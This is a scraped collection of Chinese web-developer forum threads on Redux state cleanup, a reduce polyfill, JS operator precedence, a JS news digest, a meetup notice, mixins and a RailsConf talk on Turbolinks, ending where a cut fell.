{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>必入一个单页应用有许多的不同列表页，每个列表页都会有各自庞大的列表数据，而且数据也是经常会更新的。</p>\n<p>面对这样的情况，切换不同的列表页时肯定是需要到服务器载入不同的列表数据的。如果一个用户连续点了不同的列表页，那么这些页面的数据都会保存到 redux state 里，即使切换 router 路径，数据依然会留着，很担心量大了以后会造成内存泄漏情况。</p>\n<p>考虑过把所有列表的数据都存到同一个 state 里，切换列表自动替换上一个列表页的数据，但是如果是其他部分数据也很重，这种方法就无法使用适用了。因为每个页面 state 都不完全相同。</p>\n<p>因此，对于这种情况，再每次切换 router 时候，需不需要手动清理一下当前路由的 state 呢？（\n再或者一个多用户登陆的系统，用户1再进行了一些操作以后，退出登陆，这时候用户2登陆了，那么用户1的state数据肯定是要清除的。）</p>\n</div></div>"], "reply": "4", "tittle": "使用 React-ReactRouter-Redux 全家桶，需不需要手动清理 redux 的 state 数据呢？", "comment": ["Redux 的原则就是 state tree 以及用 reducer 来分拆各个部分，所以把所有的数据放到一个 reducer 来处理是不恰当的\r", "\r", "可以在 reducer 里监听 LOCATION_CHANGE 这个 action ，每次路由发生变化就重置当前的数据，但是要注意哪怕是 URL 参数变化都会触发这个 action\r", "\r", "另外一种方法是在资源的路由的主 Component 里的 componentWillUnmount 里 dispatch 一个自定义事件，对应的 reducer 里监听并重置状态\r", "\r", "至于隔离不同的用户，那就在用户注销的地方 dispatch 一个 LOGOUT 的 action ，**每一个** reducer 里都监听它，并重置状态\r", "\r", "import { LOCATION_CHANGE } from 'react-router-redux'\r", "import * as types from 'constants/ActionTypes'\r", "\r", "const initialState = {}\r", "\r", "export default function reducer(state = initialState, action) {\r", "\r", "  switch (action.type) {\r", "\r", "    case types.LOGOUT:\r", "    case LOCATION_CHANGE:\r", "      return initialState\r", "\r", "    case types.SOME_ACTION:\r", "      return action.payload\r", "\r", "    default:\r", "      return state\r", "  }\r", "}", " 非常感谢，有一定的了解了。\r", "对于每一个不同的 view ，都需要从服务器取数据，在切换 location 的时候，这个到服务器取数据的动作应该在组件的哪个生命周期里触发呢（触发一个异步的 action 去取 http 数据）？", " componentWillMount 和 componentDidMount 里都可以， redux 的官方示例是在 componentWillMount 里发的\r", "\r", "异步 action 需要用到 thunk Middleware ，或者做一个更高级的封装，比如： ", " \r", "或者\r", " 非常感谢你的回复。目前在用 thunk middleware 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>if (!Array.prototype.reduce) {\n  Array.prototype.reduce = function(callback /*, initialValue*/) {\n    'use strict';\n    if (this == null) {\n      throw new TypeError('Array.prototype.reduce called on null or undefined');\n    }\n    if (typeof callback !== 'function') {\n      throw new TypeError(callback + ' is not a function');\n    }\n    var t = Object(this), len = t.length &gt;&gt;&gt; 0, k = 0, value;\n    if (arguments.length == 2) {\n      value = arguments[1];\n    } else {\n      while (k &lt; len &amp;&amp; !(k in t)) {\n        k++;\n      }\n      if (k &gt;= len) {\n        throw new TypeError('Reduce of empty array with no initial value');\n      }\n      value = t[k++];\n    }\n    for (; k &lt; len; k++) {\n      if (k in t) {\n        value = callback(value, t[k], k, t);\n      }\n    }\n    return value;\n  };\n}\n</code></pre>\n<p>网上找的一个数组 reduce 方法的 polyfill 方法，求大神解释一下</p>\n<pre><code>while (k &lt; len &amp;&amp; !(k in t)) {\n        k++;\n      }\n</code></pre>\n<p>这里的意义，怎么感觉好像无法进入分支啊\n在下面这个网站上看到的<br>\n<a href=\"https://msdn.microsoft.com/library/ff679975%28v=vs.94%29.aspx?f=255&amp;MSPPError=-2147217396\" rel=\"nofollow\">https://msdn.microsoft.com/library/ff679975%28v=vs.94%29.aspx?f=255&amp;MSPPError=-2147217396</a></p>\n</div></div>"], "reply": "4", "tittle": "reduce polyfill 看不太懂", "comment": ["那个循环是用来判断数组里的空位的吧：\r", "\r", " ", "  说的没有错\r", "\r", "```\r", "      while (k < len && !(k in t)) {\r", "        k++;\r", "      }\r", "      if (k >= len) {\r", "        throw new TypeError('Reduce of empty array with no initial value');\r", "      }\r", "      value = t[k++];\r", "```\r", "\r", "这里主要是将数组第一个非 undefined 值初始化 value", "我想顺便提及一下\r", "\r", "`>>>` 是 bit shift, 而且是取正数\r", "\r", "> 1 >> 4\r", "0\r", "> -1 >> 4\r", "-1\r", "> 1 >>> 4\r", "0\r", "> -1 >>> 4\r", "268435455\r", ">\r", "\r", "\r", "Reference: ", " 还有空位这茬，原来如此"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre>a=\"asdf\"\nb=\"asdf\"\na==b\n&gt;&gt;true\n!a==b\n&gt;&gt;false\n\na=\"a\"\nb=\"b\"\na==b\n&gt;&gt;false\n!a==b\n&gt;&gt;false //这里为啥是 false,而不是 true ？\n</pre>\n<p>明白了，加上括号就好了!(a==b)。\n结贴</p>\n</div></div>"], "reply": "2", "tittle": "小白问题，关于 js 。", "comment": ["首先，没看到正则...\r", "\r", "然后，!a 为 false \r", "\r", "false == 'b' // 这个并不等啊...\r", "false == '' // 这样就好了", "单目运算符 优先级高于双目运算符"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>ShiftJS</h2>\n<p><img alt=\"clipboard.png\" src=\"http://segmentfault.com/img/bVCf71\"></p>\n<p>一个 Swift 转 JavaScript 的编译器。</p>\n<p>官网：<a href=\"http://www.shiftjs.com\" rel=\"nofollow\">http://www.shiftjs.com</a></p>\n<h2>toolgif</h2>\n<p>超简单、支持 gif 的 jQuery tooltip 插件，它还会自动给你使用相关的 gif 图。</p>\n<p><img alt=\"clipboard.png\" src=\"http://segmentfault.com/img/bVCf74\"></p>\n<p>官网：<a href=\"https://mburakerman.github.io/toolgif\" rel=\"nofollow\">https://mburakerman.github.io/toolgif</a></p>\n<h2>Papa Parse</h2>\n<p>一个 CSV 处理的库，可以在 JSON 与 CSV 之间互相转换，还可以使用 worker 处理大文件。</p>\n<p>官网：<a href=\"http://papaparse.com/\" rel=\"nofollow\">http://papaparse.com/</a></p>\n<h2>PatternLock.js</h2>\n<p>类似 Android 系统图案解锁的东西。</p>\n<p><img alt=\"clipboard.png\" src=\"http://segmentfault.com/img/bVCf75\"></p>\n<p>项目地址：<a href=\"https://github.com/its-shivam/patternLock.js/\" rel=\"nofollow\">https://github.com/its-shivam/patternLock.js/</a></p>\n<h2>Recharts</h2>\n<p>一看 Re 开头的名字，很明显又是一个 React 生态圈的新物种，可以很简单的生成各种各样的图表。</p>\n<p><img alt=\"clipboard.png\" src=\"http://segmentfault.com/img/bVCf8d\"></p>\n<p>官网：<a href=\"http://recharts.org\" rel=\"nofollow\">http://recharts.org</a></p>\n<h2>Angular 2 RC5 发布</h2>\n<p>Angular 2 发布了第 5 个 RC 版本，支持<code>@NgModule</code>修饰符，增加路由的懒加载技术(Lazy-loading)，还有 components 和 services 的静态编译(AoT compilation)。</p>\n<p>原文地址：<a href=\"http://angularjs.blogspot.com/2016/08/angular-2-rc5-ngmodules-lazy-loading.html\" rel=\"nofollow\">http://angularjs.blogspot.com/2016/08/angular-2-rc5-ngmodules-lazy-loading.html</a></p>\n<h2>Angular Material 1.1 发布</h2>\n<p>Angular Material 发布了 1.1 版本，是一套遵循 Google Material Design 规范的 UI 框架，目前支持 Angular 1.x ，而支持 Angular 2 的 Angular Material 2.x 仍在 alpha preview 阶段。</p>\n<p>原文地址：<a href=\"http://angularjs.blogspot.co.uk/2016/08/angular-material-11-and-2x.html\" rel=\"nofollow\">http://angularjs.blogspot.co.uk/2016/08/angular-material-11-and-2x.html</a></p>\n<p>原文链接： <a href=\"http://t.cn/RtrfCrU\" rel=\"nofollow\">http://t.cn/RtrfCrU</a></p>\n<p>微信号：程序员晋级之路『 code-learning 』</p>\n<p><img alt=\"clipboard.png\" src=\"http://segmentfault.com/img/bVAqVW\"></p>\n</div></div>"], "reply": "3", "tittle": "JavaScript 新鲜事·第 5 期", "comment": ["Swift 转 JavaScript 还有其他语言转 javascript 的吗", " haskell elm dart....", " GopherJs   Golang->javascript"]},
{"content": ["<div class=\"topic_content\">我用的是 ifame 方法，异步取下载地址，然后给 iframe 那个地址，在 chrome 可以下载。到了手机浏览器就报 403 了，这是什么问题？</div>"], "reply": "2", "tittle": "怎么用去下载动态地址", "comment": ["是不是 UA 问题？", "ua"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>活动介绍</h2>\n<p>        近几年来，开发者们对 JavaScript 编程语言的狂热持续升温。去年 ECMAScript 6(Harmony) 的发布，以及其众多令人意外惊喜的新特性，足以让人预见，未来的 JavaScript 语言本身将会有语法以及开发效率上的大幅提升。再加上 HTML5 的发布，新的更加强大 Web API 也随之而来， JavaScript 愈加羽翼丰满，开发者借助 JavaScript 也将得以实现更多创意。 JavaScript 社区也在不断探索，不断涌现各种新的开发框架，为 JavaScript 在各个开发领域的开疆扩土立下了汗马功劳。</p>\n<p>        我们已经准备好在 8 月 28 日（本周星期日）下午继续举办一场 JavaScript 专场沙龙。现向广大 JavaScript 爱好者发出参会邀请，报名方式详见文章末尾二维码。另外，我们同时也非常欢迎参会者现场直接提供演讲主题，演讲主题不限，只要与 JavaScript 技术相关即可。</p>\n<h2>演讲主题介绍</h2>\n<h3>《使用 Meteor + React 进行快速的原型开发》</h3>\n<p><strong>讲师介绍:</strong> 荆雷，悉尼大学计算机硕士，多年软件开发经验。曾致力于多媒体、计算机视觉等领域的研发，现专注于 Node.js 、 Meteor 和 React 等进行 JavaScript 全栈开发。<br>\n<strong>主题介绍:</strong> 主要介绍 Meteor 框架的特点，如何使用 Meteor 为 React 提供类似 Redux 的前后端数据流控制，什么是 Reactive Programming ，如何实现 Optimistic UI ，还有基于 websocket 编程，以及 Meteor 的现状和未来。</p>\n<h3>《使用 ReactNative 与 mobx 像 Rails 一样极速开发 Native App 》</h3>\n<p><strong>讲师介绍:</strong> 李亚飞，一个在中国深圳的 Web 全栈开发工程师，拥有多次创业经历，先已重新登上创业之路。<br>\n<strong>主题介绍:</strong> React 是一个强大的工具，但要结合 flux 或 redux 才能构建复杂的产品，如果它与 vue 的数据绑定结合会怎么样？这就是新架构 mox-react-native ，极速开发 native app 的新方案。</p>\n<h3>《 ReactNative 与动画》</h3>\n<p><strong>讲师介绍:</strong> 叶倍宏，前自由职业者，远程办公，边旅行边工作，在云南大理住了 2 年。现在来广州发展思客教学，做有情怀的 IT 教学。<br>\n<strong>主题介绍:</strong> 介绍 React Native 基础以及动画的实践</p>\n<ul>\n<li>ReactNative 不是 H5 框架；</li>\n<li>ReactNative 的工具链和开发流程；</li>\n<li>Swift 示范原生视图的概念；</li>\n<li>ReactNative 如何驱动原生视图；</li>\n<li>原生动画介绍；</li>\n<li>DisplayLink 和动画；</li>\n<li>JS Batch 桥梁怎么优化 JS 动画。</li>\n</ul>\n<h2>活动时间地点以及报名方式</h2>\n<p><strong>活动时间：</strong> 2016 年 8 月 28 日（星期日）下午 13:30 - 18:00<br>\n<strong>活动地点：</strong> 深圳市南山区科苑路 9 号讯美科技广场 3 号楼 15 楼 阿基米互联网公社<br>\n<strong>报名方式：</strong> 请点击<a href=\"http://www.huodongxing.com/event/3348896452300\" rel=\"nofollow\">“活动行”</a>链接扫描以下报名链接二维码！\n<img alt=\"\" src=\"http://7xr4x5.dl1.z0.glb.clouddn.com/%E6%B7%B1%E5%9C%B3js%E6%8A%A5%E5%90%8D%E4%BA%8C%E7%BB%B4%E7%A0%81.png\"></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "[深圳] Techparty 8 月 28 日 JavaScript 技术专场沙龙", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>用 react 整合一些现有的插件，如 imagecropper 图像裁剪插件的使用，需要 new 一个对象出来，再在这个对象上进行一些图像操作。</p>\n<p>因为这个对象是提供功能而非提供组件数据渲染的，因此把他通过 this.setState 的话，会不可避免的导致 react 进行 state 数据对比然后重新渲染组件。考虑过在 shouldcomponentupdate 里做判断来决定是否更新组件来避免 react对象比较和重新渲染（虽然这个对比过程很快）。</p>\n<p>而这个判断的逻辑可能会导致一些不必要的问题，对象比较中存在人为的逻辑漏洞（深浅对象对比等），则可能导致组件渲染的异常。</p>\n<p>因此既要有一个可以存放对象的地方，又可以避免不必要组件重渲染，那我是否可以把这个对象当成 react 组件对象的一个成员对象存在呢？其实这个方法是可行的，我只是想了解一下，这样做是否是 react 实践的一种反模式或者从长远来看是否会产生一些弊端？</p>\n<p>目前自己的项目是用 react 全家桶(react\\react-redux-react-router-redux)， redux state 存全局的数据，组件自身的 state 来存放组件自身的一些局部状态（开关、表单数据），貌似上边的 imagecropper 不管是放 redux state 还是组件自身 state ， imagecropper 对象的改变都会导致组件重新渲染，总不至于放全局变量吧。。。想来想去还是放在组件成员变量里好啊</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "[React]对于一些不需要渲染到组件上展示的数据对象，可不可以做为组件类的成员变量的存在？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚开始，代码只是代码而已。当代码多了，我们发明了函数，以便代码可以重用。到后来，我们的函数也越来越多，所以我们又发明了别的一些编程概念。但是当我们沉迷于这些新概念的同时，我们可能就错过了一些近在眼前的美丽事物……</p>\n<h2>类继承</h2>\n<p>类概念主要存在于面向对象编程中的，可能大家上学时都学过，比如 Java 、 C#、 Objective-C 等面向对象语言。每个实体都需要先要有一个类，这个类对于我们来说是比较抽象的（不是说 abstract class 哦），然后子类还可以继承父类。</p>\n<p>这感觉似乎有点亚里士多德形而上学和分类法的味道，但简单来说这就是面向对象的基础，在写出实际代码之前，你得先写出一些类、接口，然后类继承类、类实现接口……</p>\n<p>实际上我们人类并不是非常擅长分类，打个比方，一个按钮（ Button ），它应该是一个矩形（ Rectangle ），还是一个控件（ Control ）呢？我们可以让 Button 继承 Rectangle ，让 Rectangle 继承 Control ……等等，是不是有什么不对？</p>\n<p>所以，面向对象的概念可能会在项目刚开始时就把你压垮，但这并不是说面向对象就不好，只是有时候并不适合你的项目。</p>\n<h2>原型链继承</h2>\n<p>可能大家都知道， JavaScript 是不支持<code>class</code>关键字的，因为 JavaScript 本身就不作为一个面向对象语言来设计，但并不妨碍大家想出各种招来实现<code>class</code>。</p>\n<p>JavaScript 是基于原型链(Prototype)继承的，但是其诡异的写法可能让好多初学者望而却步。</p>\n<pre><code>function Circle() {\n  this.radius = 7;\n}\nCircle.prototype = {\n  area: function () {\n    return Math.PI * this.radius * this.radius;\n  },\n  grow: function () {\n    this.radius++;\n  },\n  shrink: function () {\n    this.radius--;\n  }\n};\n</code></pre>\n<p>在 ES5 之后，我们有了<code>Object.create</code>方法，好理解了一些。</p>\n<pre><code>var circle = Object.create({\n  area: function () {\n    return Math.PI * this.radius * this.radius;\n  },\n  grow: function () {\n    this.radius++;\n  },\n  shrink: function () {\n    this.radius--;\n  }\n}, {\n  radius: {\n    writable: true,\n    configurable: true,\n    value: 7\n  }\n});\n</code></pre>\n<p>只是第二参数用起来有点复杂，其实就是跟<code>Object.defineProperties()</code>的参数一样，但是我们现在又有了 ES6 呀：</p>\n<pre><code>class Cicle {\n  constructor() {\n    this.radius = 7;\n  }\n  area() {\n    return Math.PI * this.radius * this.radius;\n  }\n  grow() {\n    this.radius++;\n  }\n  shrink() {\n    this.radius--;\n  }\n}\n</code></pre>\n<p>这都是一些使用 JavaScript 实现<code>class</code>的例子，实际上， JavaScript 还可以有另外一种重用代码的方式—— Mixins 。</p>\n<h2>Mixins</h2>\n<p>这就是我们今天的主题，近在眼前的美丽事物，但可不是什么新概念，用过 Ruby 或 Python 的同学，可能有所耳目， Mixins 的字面意思就是把东西掺合在一起。</p>\n<p>在 JavaScript 我们有<code>call</code>和<code>apply</code>，很容易切换上下文，将各种互不相干糅合，达到 Mixins 的目的。</p>\n<p>假设我们要做一个圆形按钮(RoundButton)，它有两个特性：</p>\n<ol>\n<li>是圆的</li>\n<li>可点击</li>\n</ol>\n<p>我们可以把这两个特性分别写做 2 个函数：</p>\n<pre><code>// 是圆的\nvar withCircle = function () {\n  this.area = function () {\n    return Math.PI * this.radius * this.radius;\n  };\n  this.grow = function () {\n    this.radius++;\n  };\n  this.shrink = function () {\n    this.radius--;\n  }\n}\n\n// 可点击\nvar withClickable = function () {\n  this.hover = function () {\n    console.log('hovering');\n  };\n  this.press = function () {\n    console.log('button pressed');\n  };\n  this.release = function () {\n    console.log('button released');\n  };\n  this.fire = function () {\n    this.action.fire();\n  };\n}\n</code></pre>\n<p>这是我们的圆形按钮：</p>\n<pre><code>var RoundButton = function(radius, label, action) {\n  this.radius = radius;\n  this.label = label;\n  this.action = action;\n};\n</code></pre>\n<p>现在我们要让给这个圆形按钮附上那两个特性：</p>\n<pre><code>withCircle.call(RoundButton.prototype);\nwithClickable.call(RoundButton.prototype);\n\nvar button = new RoundButton(4, 'yes!', function() {\n  return 'you said yes!'\n});\nbutton1.fire(); // 输出 'you said yes!'\n</code></pre>\n<p>这样写，是不是瞬间显得既简洁又自然？让人一眼看懂代码在做什么。</p>\n<p>当然这些附加特性的函数用的多了，也就创建了许多函数，这里可以简单的用一个立即执行函数（<a href=\"https://en.wikipedia.org/wiki/Immediately-invoked_function_expression\" rel=\"nofollow\">Immediately Invoked Function Expression</a>）的闭包来对其进行优化一下，以<code>withCircle</code>为例：</p>\n<pre><code>var withCircle = (function () {\n  function area() {\n    return Math.PI * this.radius * this.radius;\n  }\n  function grow() {\n    this.radius++;\n  }\n  function shrink() {\n    this.radius--;\n  }\n  return function () {\n    this.area = area;\n    this.grow = grow;\n    this.shrink = shrink;\n  };\n})();\n</code></pre>\n<p>这样就不需要每次使用都新建函数了，从而节省更多的资源。</p>\n<h2>Advice</h2>\n<p>有时候，你无法确保某些函数可能会覆盖原有的功能，例如以下例子：</p>\n<pre><code>Button.prototype.press = function() {\n  console.log('pressed');\n};\n\n// 这时再用我们的 withClickable ，就会覆盖掉 press\nwithClickable.call(Button.prototype);\n</code></pre>\n<p>这时候我们应该采用 Advice ， Twitter 的<a href=\"https://github.com/flightjs/flight/blob/master/doc/advice_api.md\" rel=\"nofollow\">Flight</a>框架已经提供了此功能：</p>\n<pre><code>var withClickable = function () {\n  this.after('press', function () {\n    console.log('press again.');\n  });\n};\n\nwithAdvice.call(Button.prototype);\nwithClickable.call(Button.prototype);\n\nvar button = new Button();\nbutton.press(); // 输出 'pressed', 'press again.'\n</code></pre>\n<p>两个<code>press</code>并不会互相冲突，而是有先后顺序的执行，就类似通过<code>addEventListener</code>添加了多个事件而不是直接修改<code>onclick</code>一样，具体细节可以参考 Flight 的 API 。</p>\n<h2>小结</h2>\n<p>作为一名程序员，我们或许在上学时就被灌输了面向对象的固有思想，毕竟面向对象从上世纪 90 年代到现在，经久不衰，自由它的优势。但是在 JavaScript 中，如果你并不善于面向对象的抽象思维，何不尝试一下 Mixins 呢？而且 Mixins 与类继承相比，还能更好的解耦合，可以用于任何 Object 之上，正好用上了 JavaScript 若类型的优势。</p>\n<p>最近在读<a href=\"https://www.amazon.cn/Beautiful-JavaScript-Leading-Programmers-Explain-How-They-Think-Kovalyov-Anton/dp/1449370756\" rel=\"nofollow\">《 Beautiful JavaScript 》</a>这本书，有一些好的内容，正好可以跟大家分享，但并不是全部，有兴趣的同学也可以自己读一下，请支持正版。</p>\n<p>原文链接： <a href=\"http://t.cn/RteECIF\" rel=\"nofollow\">http://t.cn/RteECIF</a>\n微信号：程序员晋级之路『 code-learning 』</p>\n<p><img alt=\"clipboard.png\" src=\"http://segmentfault.com/img/bVAqVW\"></p>\n</div></div>"], "reply": "1", "tittle": "Beautiful Mixins -《Beautiful JavaScript》读书分享", "comment": [" \r", "Js 好折腾.."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h6>除了 React / Vue ，你还应该看看其他开发模式</h6>\n<p><a href=\"https://www.youtube.com/watch?v=SWEts0rlezA\" rel=\"nofollow\">原视频</a></p>\n<p>本文作者：方应杭（微信： frank_fang ）</p>\n<p>本文很长，但请耐心看完，因为末尾有广告。。。</p>\n<p>这个视频来自 RailsConf 2016 ，演讲者是 Sam Stephenson ，他主要的开源作品有 <a href=\"https://github.com/rbenv/rbenv\" rel=\"nofollow\">rbenv</a>、<a href=\"http://pow.cx/\" rel=\"nofollow\">Pow</a> 和 <a href=\"https://github.com/basecamp/trix\" rel=\"nofollow\">Trix</a>，曾是 Rails 的核心开发人员。目前在 Basecamp 工作。</p>\n<p>从这个视频，你可以明显地看出前后端开发者思考问题的差异。</p>\n<p>好了我们进入正题，看看他讲了什么。括号里面的话是我说的，其他都是演讲者说的。</p>\n<hr>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%201.34.01%20AM.png\"></p>\n<p>⬆️ 我们一共 10 个开发者，其他 6 个 Rails 开发、 2 个 iOS 开发和 2 个安卓开发，在 18 月完成了共 200 个设计图、部署到五个平台的 Basecamp 3 。</p>\n<p>（你能想象不用纯前端开发者来开发一个 Web 应用吗？）</p>\n<hr>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%201.38.15%20AM.png\"></p>\n<p>⬆️ 我们来回顾下从 2004 年开始， Web 开发经历了怎样的过程。</p>\n<hr>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%201.40.11%20AM.png\"></p>\n<p>⬆️ J2EE ，典型的三层架构：数据层+业务逻辑层+表现层。（前端这个职业还没诞生吧）</p>\n<hr>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%201.42.08%20AM.png\"></p>\n<p>⬆️ 然后是 PHP （ PHP 是招黑体质）</p>\n<hr>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%201.44.02%20AM.png\"></p>\n<p>⬆️ 然后是以 Rails 为代表的 MVC 。那个时期是 Rails 的黄金时代，然而浏览器的性能令人沮丧。</p>\n<p>整个 request-response 的循环简单而优雅。</p>\n<hr>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%201.47.34%20AM.png\"></p>\n<p>⬆️ 我们对服务器渲染 HTML 的性能不是很满意，同时浏览器的性能进一步提高了，所以我们觉得可以把渲染放到浏览器上来做。</p>\n<p>（可以看到简单的环状结构变得比较复杂了：浏览器从服务器获取 model ，同时自身维护着 router 、 view 和 controller 。）</p>\n<p>浏览器从服务器得到一个空的页面，然后用 JS 启动这个页面。 JS 发起很多 API 请求。服务器接收 JSON ，输出 JSON 。所有的 HTML 渲染，由浏览器完成。</p>\n<p>大家都觉得这主意不错，是吧？</p>\n<ul>\n<li>我们的应用总得需要 API 对吧。为啥不在应用内部也使用 API 对吧？</li>\n<li>而且还能让表现（ presentatioin ）与数据（ data ）解耦，解耦总是对的对吧？</li>\n</ul>\n<hr>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%201.57.08%20AM.png\"></p>\n<p>⬆️ 但是，前端们还是觉得客户端 MVC 的性能不够好，所以又引入了虚拟 DOM 来最小化 DOM 操作。</p>\n<p>想法很不错。既然 DOM 操作慢，我们就尽量不要操作 DOM 。</p>\n<p>但是呢，有两个问题：</p>\n<ol>\n<li>所以这些 JS 代码和 API 请求，让首页渲染，非常非常非常慢。</li>\n<li>所有内容，都无法被搜索引擎检索到。</li>\n</ol>\n<hr>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%202.01.12%20AM.png\"></p>\n<p>(没事，再加功能）</p>\n<p>⬆️ 所以我们决定不用浏览器来渲染首屏了，让服务器来（回到老路子）。但是由于渲染逻辑我们不想做两遍，所以我们需要在服务器添加一个 JS runtime 来执行 JS 才行，这样浏览器端的渲染逻辑在服务器上也能跑起来了。</p>\n<p>服务器也要支持虚拟 DOM ，因为客户端操作的就是虚拟 DOM 。</p>\n<p>那么上面这个图就是全貌了，把我们 2004 年的设计，重新改写了。</p>\n<p>但是复杂度，真的是爆炸性增长。</p>\n<p>一个 Web 应用的依赖，已经成千上百了。</p>\n<p>整个系统复杂到，一个人，不可能对其了然于胸。</p>\n<p>我们的队员需要分别去掌握其中某个子系统。</p>\n<hr>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%202.10.55%20AM.png\"></p>\n<p>⬆️ 康威定律</p>\n<p>讲真，你们这些人知道康威定律吗？</p>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%202.12.31%20AM.png\"></p>\n<blockquote>\n<p>系统的设计团队受其生产系统的约束，而生产系统又是根据设计团队的沟通结构决定的。</p>\n</blockquote>\n<p>⬆️ 康威定律说，软件产品的结构就是其创造团队的组织结构的镜像。</p>\n<p>我们正在使用的客户端渲染框架，来自于 Google 和 Facebook ，这两家公司有数千开发者，这些开发者隶属于数十个团队，组织结构就像这样：</p>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%202.20.38%20AM.png\"></p>\n<p>⬆️ （是不是跟上面带有虚拟 DOM 的那种架构图很像？）</p>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%202.23.05%20AM.png\"></p>\n<p>⬆️ （认清自己吧，少年）</p>\n<p>你的团队面临的问题，很可能跟 Google 和 Facebook 所面临的不一样。</p>\n<p>使用那些客户端框架时，我们是为了追逐性能，我们做的每个决定都是对的，但是放在一起看看结果，我们获得了微小的性能提升，却在工程方面花费了惨重的代价。</p>\n<p>如果继续深入这条路，这条路就会变得越窄。</p>\n<hr>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%202.29.23%20AM.png\"></p>\n<p>(还没完）</p>\n<p>⬆️ 由于我们除了要支持 Web ，还要支持 iOS 和安卓，所以，我们要制造出三个类似的系统。</p>\n<p>（讲述者没有再说 React Native 了，因为这个思路是一样的：开发者选择客户端渲染，同时不想做三次，只能让 JS 运行在三个平台上。这就是「路越来越窄」，开发者把自己限定死了的意思）</p>\n<hr>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%202.32.44%20AM.png\"></p>\n<p>⬆️ Fuck that.</p>\n<p>我们来重新审视一下吧。</p>\n<p>如果我们希望一个小团队能做大项目，那么就不应该把系统搞得这么复杂。</p>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%202.35.38%20AM.png\"></p>\n<p>⬆️ （又出现这张图）</p>\n<hr>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%202.36.30%20AM.png\"></p>\n<p>⬆️ 让 iOS 和安卓直接使用 View 。</p>\n<p>Web 的 View 可以作为 iOS 和安卓的基础，然后想办法优化使其体验起来像是本地应用。 Turbolinks 5 ，做的就是这件事情。</p>\n<hr>\n<p><img alt=\"\" src=\"http://7xi9xz.com1.z0.glb.clouddn.com/rails-speaker-1/Screen%20Shot%202016-08-17%20at%202.39.20%20AM.png\"></p>\n<p>⬆️ 你的服务器依然渲染整个 HTML 。</p>\n<p>Turbolinks 异步请求页面，然后使用得到的 head 和 body 替换当前页面。 head 会做合并， body 则直接替换。</p>\n<p>（后面演讲者演示了 Turbolinks 的效果，有兴趣的人可以去看看<a href=\"https://www.youtube.com/watch?v=SWEts0rlezA\" rel=\"nofollow\">视频</a>。另外 Turbolinks 还提供了 iOS 和安卓的 SDK ，让移动端体验更顺滑）</p>\n<p>（演讲者也承认，这样的模式渲染一个页面大概 300ms ，没有很快，但是绝对够用。我看了下在 iOS 下的表现，切换页面时的 loading 时间确实有点长，但是能忍，也许再加点优化可以做到 1s 左右）</p>\n<hr>\n<p>相关观点：</p>\n<p><a href=\"http://v2ex.com/t/298014\" rel=\"nofollow\">《为什么我不喜欢「前后端分离」》</a> - 18596 views</p>\n<p><a href=\"http://v2ex.com/t/293050\" rel=\"nofollow\">《不依赖 Gulp 、 Babel 、 WebPack ，还能优雅地写代码吗》</a> - 6775 views</p>\n<p>广告：</p>\n<p>我现在在「彩程」（主要产品是「知人」和「 Tower 」），从事 Rails 开发，欢迎有志青年一起来「远程开发」，不用每天浪费三个小时在车上，而是用来学习新知识，真的很好。</p>\n<p>邮箱： frankfang1990atgmail</p>\n</div></div>", "<div class=\"topic_content\">注意演讲者针对的不是小网站。\r<br>Basecamp 3 绝对不是小网站。\r<br>有些人看了本文，依然人云亦云。\r<br>现在用 React / Vue 的才是小网站。</div>", "<div class=\"topic_content\">彩程的知人是用上面说的模式。\r<br>Tower 用的是 Vue + API 模式。\r<br>投简历时请写清楚。\r<br>cc @<a target=\"_blank\" href=\"/member/kshift\">kshift</a></div>", "<div 